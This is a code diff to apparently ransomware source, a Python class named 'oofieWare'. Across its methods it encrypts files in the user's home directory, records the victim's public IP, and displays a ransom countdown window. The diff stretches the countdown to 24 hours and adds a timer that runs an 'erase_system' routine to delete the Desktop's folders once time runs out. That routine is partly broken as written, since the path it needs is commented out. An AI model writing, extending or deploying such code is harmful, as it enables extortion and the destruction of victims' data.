@@ -1,5 +1,6 @@
 import os
 import subprocess
+import shutil
 import threading
 import socket
 import base64
@@ -20,6 +21,7 @@ class oofieWare:
         self.decrypter = None
         self.started = False
         self.startPoint = os.path.expanduser("~")
+        # self.Desktop = os.path.normpath(os.path.expanduser("~/Desktop"))
         self.LARGE_SIZE = 50_000_000
         self.PUBLIC_IP = requests.get('https://api.ipify.org').text
         self.PRIVATE_IP = socket.gethostbyname(socket.gethostname())
@@ -82,7 +84,7 @@ class oofieWare:
                 y.close()
 
     def crypt_system(self):
-        for root, dirs, files in os.walk(self.startPoint):
+        for root, dirs, files in os.walk(self.startPoint, topdown = True):
             for file in files:
                 file_path = os.path.join(root, file)
                 if not (os.stat(file_path).st_size > self.LARGE_SIZE):
@@ -194,10 +196,21 @@ class oofieWare:
         frame2.pack(fill=tk.X)
         countdownFrame.pack(fill=tk.BOTH, expand=True)
 
-        countdown("01:30:00")
+        countdown("24:00:00")
+
+        eraseTimer = threading.Timer(60*60*24, self.erase_system)
+
+        eraseTimer.start()
 
         window.mainloop()
 
+    def erase_system(self):
+        for root, dirs, files in os.walk(self.Desktop, topdown = True):
+            try:
+                shutil.rmtree(os.path.join(root, dirs))
+            except OSError as e:
+                pass
+            
     
 
 
